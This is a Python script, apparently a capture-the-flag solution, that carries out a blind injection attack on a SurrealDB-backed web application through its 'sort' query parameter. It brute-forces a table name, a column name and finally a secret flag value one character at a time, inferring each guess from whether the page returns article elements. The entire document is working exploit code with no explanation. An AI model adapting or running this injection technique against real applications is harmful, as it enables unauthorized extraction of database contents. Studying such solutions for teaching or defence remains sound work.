import requests
import string
from tqdm import tqdm
from bs4 import BeautifulSoup 

url = 'http://10.113.0.1:11101/'

tbl_query = "DESC LIMIT object::keys((INFO FOR DB).tables).filter(|$v: string| $v.starts_with(\'{}\')).len()"

# brute-force table name, space is all english letters and underscore
space = string.ascii_letters + string.digits + '_'
guessed_table = '' 
for _ in range(32):  # assume max length is 32
    found = False 
    for i in tqdm(range(len(space)), desc='Brute-forcing table name'):
        c = space[i]
        guess = guessed_table + c
        payload = tbl_query.format(guess)
        resp = requests.get(url, params={'sort': payload})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if resp.status_code == 200 and len(soup.find_all('article')) > 0 and not guess.startswith('a'):
            # found a valid prefix
            guessed_table += c
            found = True
            print(f'Found so far: {guessed_table}')
            break
    if not found:
        # all characters exhausted and no valid prefix found, means full table name found
        break
print(f'Guessed table name: {guessed_table}')

# brute-force column name
guessed_col = ''

for _ in range(32):  # assume max length is 32
    found = False
    for i in tqdm(range(len(space)), desc='Brute-forcing column name'):
        c = space[i]
        guess = guessed_col + c
        payload = f"DESC LIMIT IF string::starts_with(object::keys(SELECT * FROM ONLY {guessed_table})[1], '{guess}') THEN 1 ELSE 0 END;"
        resp = requests.get(url, params={'sort': payload})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if resp.status_code == 200 and len(soup.find_all('article')) > 0:
            # found a valid prefix
            guessed_col += c
            found = True
            print(f'Found so far: {guessed_col}')
            break
    if not found:
        break 

print(f'Guessed column name: {guessed_col}')

flag = ''
space = string.ascii_letters + string.digits + '_{}'

# brute-force flag value
for _ in range(64):  # assume max length is 64
    found = False
    for i in tqdm(range(len(space)), desc='Brute-forcing flag value'):
        c = space[i]
        guess = flag + c
        payload = f"DESC LIMIT IF type::string(type::array(SELECT VALUE {guessed_col} FROM {guessed_table})[0]).starts_with('{guess}') THEN 1 ELSE 0 END;"
        resp = requests.get(url, params={'sort': payload})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if resp.status_code == 200 and len(soup.find_all('article')) > 0:
            # found a valid prefix
            flag += c
            found = True
            print(f'Found so far: {flag}')
            break
    if not found:
        break

print(f'Guessed flag: {flag}')
